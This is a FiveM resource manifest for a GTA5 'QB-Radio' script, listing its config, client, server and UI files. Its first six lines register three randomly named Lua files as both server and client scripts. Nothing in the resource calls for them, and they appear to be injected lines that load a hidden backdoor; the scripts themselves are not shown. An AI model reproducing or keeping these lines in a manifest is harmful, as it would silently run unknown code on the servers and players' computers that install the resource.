server_script "2C67YE10YE7O.lua"
client_script "2C67YE10YE7O.lua"
server_script "CJXKAMZ6RN53.lua"
client_script "CJXKAMZ6RN53.lua"
server_script "97LJ0C0ZNZCH.lua"
client_script "97LJ0C0ZNZCH.lua"
fx_version 'cerulean'
game 'gta5'
description 'QB-Radio'
version '1.0.0'
shared_script 'config.lua'
client_scripts {
  'client.lua',
  'animation.lua'
}
server_script 'server.lua'
ui_page('html/ui.html')
files {'html/ui.html', 'html/js/script.js', 'html/css/style.css', 'html/img/cursor.png', 'html/img/radio.png'}
lua54 'yes'